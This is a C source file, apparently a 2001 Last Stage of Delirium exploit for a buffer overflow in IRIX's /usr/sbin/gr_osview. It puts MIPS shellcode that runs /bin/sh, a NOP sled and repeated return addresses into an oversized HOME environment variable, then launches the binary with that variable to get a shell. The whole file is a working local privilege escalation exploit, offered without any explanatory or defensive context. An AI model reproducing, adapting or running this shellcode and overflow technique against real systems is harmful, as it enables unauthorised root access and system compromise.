/*## copyright LAST STAGE OF DELIRIUM jul 2001 poland        *://lsd-pl.net/ #*/
/*## /usr/sbin/gr_osview                                                     #*/

#define NOPNUM 15000
#define ADRNUM 4200 

char shellcode[]=
    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "/bin/sh"
;

char jump[]=
    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
    "\x03\xe0\x00\x08"    /* jr      $ra                  */
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[20000],adr[4],*b,*envp[2];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM jul 2001 poland  //lsd-pl.net/\n");
    printf("/usr/sbin/gr_osview for irix 6.2 6.4  IP:17,19,20,21,22,32\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+16000+4200+7500;

    envp[0]=buffer;
    envp[1]=0;

    b=buffer;
    sprintf(b,"HOME=");
    b+=5;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i]; 
    *b=0;

    execle("/usr/sbin/gr_osview","lsd",0,envp);
}
